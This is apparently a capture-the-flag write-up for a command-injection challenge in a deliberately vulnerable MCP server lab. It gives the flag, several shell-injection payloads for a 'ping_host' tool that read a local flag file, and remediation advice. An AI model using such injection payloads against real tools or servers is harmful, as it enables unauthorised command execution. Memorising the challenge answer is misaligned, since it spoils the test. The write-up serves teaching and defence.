# Challenge 9: Command Injection

## Vulnerability

The MCP server on port 9009 provides a `ping_host` tool that passes user input directly into a shell command without sanitization. An attacker can inject arbitrary shell commands using standard shell metacharacters (`;`, `&&`, `|`, backticks).

## Flag

`DVMCP{ch9_cmd_1nj3ct10n_b2c7}`

## Attack Steps

1. Connect to the MCP server running on `localhost:9009`.
2. Call `ping_host` with a payload containing shell injection:
   ```
   ping_host(host="8.8.8.8; cat /tmp/dvmcp_challenge9/flag.txt")
   ```
3. The server constructs a command like `ping -c 1 8.8.8.8; cat /tmp/dvmcp_challenge9/flag.txt` and executes it in a shell.
4. The output contains the normal ping result followed by the flag file contents.
5. The flag `DVMCP{ch9_cmd_1nj3ct10n_b2c7}` is revealed.
6. Alternative injection payloads also work:
   ```
   ping_host(host="8.8.8.8 && cat /tmp/dvmcp_challenge9/flag.txt")
   ping_host(host="$(cat /tmp/dvmcp_challenge9/flag.txt)")
   ping_host(host="8.8.8.8 | cat /tmp/dvmcp_challenge9/flag.txt")
   ```

## Remediation

- Never pass user input directly into shell commands.
- Use parameterized APIs (e.g., `subprocess.run(["ping", "-c", "1", host])`) instead of shell=True.
- Validate input against a strict allowlist (e.g., IP address regex).
- Apply input sanitization to reject shell metacharacters (`;`, `|`, `&`, `$`, backticks).
